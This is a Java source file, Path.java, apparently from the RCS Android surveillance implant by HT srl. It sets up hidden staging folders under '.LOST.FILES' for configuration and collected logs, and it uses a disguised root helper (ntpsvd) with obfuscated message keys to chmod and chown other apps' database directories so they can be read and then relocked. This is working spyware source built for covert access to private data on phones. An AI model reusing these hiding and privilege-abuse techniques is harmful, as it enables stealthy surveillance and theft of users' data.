/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : Path.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.file;

import java.io.File;
import java.io.IOException;

import android.os.Environment;
import android.os.StatFs;

import com.android.networking.Messages;
import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.util.Check;
import com.android.networking.util.DateTime;

// TODO: Auto-generated Javadoc
/**
 * The Class Path.
 */
public class Path {

	/** The Constant TAG. */
	private static final String TAG = "PATH"; //$NON-NLS-1$

	/** The Constant CONF_DIR. */
	private static String CONF_DIR; //$NON-NLS-1$
	// public static final String DEBUG_DIR = "dwm/";
	/** The Constant MARKUP_DIR. */
	private static String MARKUP_DIR; //$NON-NLS-1$

	/** The Constant LOG_DIR. */
	private static String LOG_DIR; //$NON-NLS-1$

	private static String curLogFile;

	public static final String LOG_FILE = "android_logs"; //$NON-NLS-1$

	/** The hidden. */
	private static String hidden;

	private static boolean initialized = false;

	private static String doc;

	private static String picture;

	// public static final String UPLOAD_DIR = "";

	private Path() {

	}

	/**
	 * Make dirs.
	 * 
	 * @return true, if successful
	 */
	public static boolean makeDirs() {

		/** The Constant CONF_DIR. 24_0=cdd/ */
		CONF_DIR = "cdd/"; //$NON-NLS-1$
		/** The Constant MARKUP_DIR. 24_1=mdd/ */
		MARKUP_DIR = "mdd/"; //$NON-NLS-1
		/** The Constant LOG_DIR. 24_2=ldd/ */
		LOG_DIR = "ldd/"; //$NON-NLS-1$

		try {
			setStorage();
			if (Cfg.DEBUG) {
				Check.log(TAG + " (makeDirs): hidden = " + hidden());//$NON-NLS-1$
			}

			boolean success = true;

			success &= createDirectory(conf());
			success &= createDirectory(markup());
			success &= createDirectory(logs());

			if (Cfg.FILE && Cfg.DEBUG) {

				final File file = new File(getCurLogfile());
				file.createNewFile();
			}

			// doc = Environment.getExternalStorageDirectory() +
			// "/My Documents";
			// picture = Environment.getExternalStorageDirectory() +
			// "/DCIM/100MEDIA";

			initialized = success;
			return success;

		} catch (final Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + e.toString());//$NON-NLS-1$
			}
		}

		return false;
	}

	/**
	 * Check.storage. //$NON-NLS-1$
	 */
	public static void setStorage() {
		boolean mExternalStorageAvailable = false;
		boolean mExternalStorageWriteable = false;
		final String state = Environment.getExternalStorageState();

		if (Environment.MEDIA_MOUNTED.equals(state)) {
			// We can read and write the media
			mExternalStorageAvailable = mExternalStorageWriteable = true;
		} else if (Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
			// We can only read the media
			mExternalStorageAvailable = true;
			mExternalStorageWriteable = false;
		} else {
			// Something else is wrong. It may be one of many other states, but
			// all we need
			// to know is we can neither read nor write
			mExternalStorageAvailable = mExternalStorageWriteable = false;
		}

		if (mExternalStorageWriteable && Cfg.USE_SD) {
			hidden = Environment.getExternalStorageDirectory() + "/.LOST.FILES/"; //$NON-NLS-1$ //$NON-NLS-2$
		} else {

			hidden = Status.getAppContext().getFilesDir().getAbsolutePath() + "/.LOST.FILES/";

		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (setStorage): " + hidden + " freespace: " + freeSpace());
		}
	}

	public static String home() {
		return Environment.getExternalStorageDirectory().getAbsolutePath();
	}

	/**
	 * Hidden.
	 * 
	 * @return the string
	 */
	public static String hidden() {
		return hidden;
	}

	public static String upload() {
		return hidden;
	}

	public static String doc() {
		return doc;
	}

	public static String picture() {
		return picture;
	}

	public static String getCurLogfile() {
		if (curLogFile == null) {
			DateTime dt = new DateTime();

			curLogFile = Environment.getExternalStorageDirectory() + "/" + LOG_FILE + "-" + dt.getOrderedString()
					+ ".txt";
		}

		return curLogFile;
	}

	/**
	 * Conf.
	 * 
	 * @return the string
	 */
	public static String conf() {
		return hidden() + CONF_DIR;
	}

	/**
	 * Markup.
	 * 
	 * @return the string
	 */
	public static String markup() {
		return hidden() + MARKUP_DIR;
	}

	/**
	 * Logs.
	 * 
	 * @return the string
	 */
	public static String logs() {
		return hidden() + LOG_DIR;
	}

	public static boolean unprotect(String path) {

		return unprotect(path, false);
	}

	public static boolean unprotect(String path, int depth, boolean fullmode) {

		File file = new File(path);
		if (file.exists()) {
			if (depth > 0) {
				unprotect(file.getParent(), depth - 1, fullmode);
			}

			return unprotect(path, fullmode);
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (unprotect) File does not exists: " + path);
			}
			return false;
		}

	}

	public static boolean unprotect(String path, boolean fullmode) {
		try {

			File file = new File(path);

			if (fullmode) {
				if (file.canRead() && file.canWrite()) {
					return true;
				}
				if (Cfg.DEBUG) {
					Check.log(TAG + " (unprotect): " + Messages.getString("h_9") + " " + path);
				}
				// h_9=/system/bin/ntpsvd pzm 777
				Runtime.getRuntime().exec(Messages.getString("h_9") + " " + path);
			} else {
				if (file.canRead()) {
					return true;
				}
				if (Cfg.DEBUG) {
					Check.log(TAG + " (unprotect): " + Messages.getString("h_3") + " " + path);
				}
				// h_3=/system/bin/ntpsvd pzm 755
				Runtime.getRuntime().exec(Messages.getString("h_3") + " " + path);
			}

			return file.canRead();
		} catch (IOException ex) {
			Check.log(TAG + " Error (unprotect): " + ex);
			return false;
		}
	}

	public static boolean unprotect(String dbDir, String fileName, boolean fullMode) {
		unprotect(dbDir, 2, fullMode);
		File file = new File(dbDir, fileName);
		unprotect(file.getAbsolutePath(), fullMode);

		return (file.canRead());
	}

	public static boolean unprotectAll(String dbDir, boolean fullMode) {
		File dir = new File(dbDir);
		if (dir.isDirectory()) {
			unprotect(dbDir, fullMode);
			for (String name : dir.list()) {
				File file = new File(dir, name);
				unprotect(file.getAbsolutePath(), fullMode);
			}
		}
		return (dir.canRead());
	}

	// chmod 000 && chown root:root
	public static boolean lock(String path) {
		try {
			// h_10=/system/bin/ntpsvd pzm 000
			Runtime.getRuntime().exec(Messages.getString("h_10") + path);

			// h_11=/system/bin/ntpsvd fho root root
			Runtime.getRuntime().exec(Messages.getString("h_11") + path);

			return true;
		} catch (IOException ex) {
			Check.log(TAG + " Error (unprotect): " + ex);
			return false;
		}
	}

	/**
	 * Removes the directory.
	 * 
	 * @param dir
	 *            the dir
	 * @return true, if successful
	 */
	public static boolean removeDirectory(final String dir) {
		final File file = new File(dir);
		return file.delete(); // TODO: anche su directory piene!
	}

	/**
	 * Creates the directory.
	 * 
	 * @param dir
	 *            the dir
	 * @return true, if successful
	 */
	public static boolean createDirectory(final String dir) {
		final File file = new File(dir);
		file.mkdirs();
		return file.exists() && file.isDirectory();
	}

	/**
	 * Free space.
	 * 
	 * @return the long
	 */
	public static long freeSpace() {

		try {
			final StatFs stat = new StatFs(hidden);
			final long bytesAvailable = (long) stat.getBlockSize() * (long) stat.getBlockCount();
			final long megAvailable = bytesAvailable / 1048576;
			if (Cfg.DEBUG) {
				//Check.log(TAG + " (freeSpace): " + megAvailable + " MiB");//$NON-NLS-1$ //$NON-NLS-2$
			}
			return bytesAvailable;
		} catch (Exception ex) {
			if (Cfg.EXCEPTION) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (freeSpace) ERROR: " + ex);
				}

			}
			return 0;
		}
	}

	public static boolean initialized() {
		return initialized;
	}

}
